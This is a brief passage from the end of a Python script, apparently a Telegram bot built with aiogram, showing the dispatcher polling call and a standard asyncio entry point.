    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())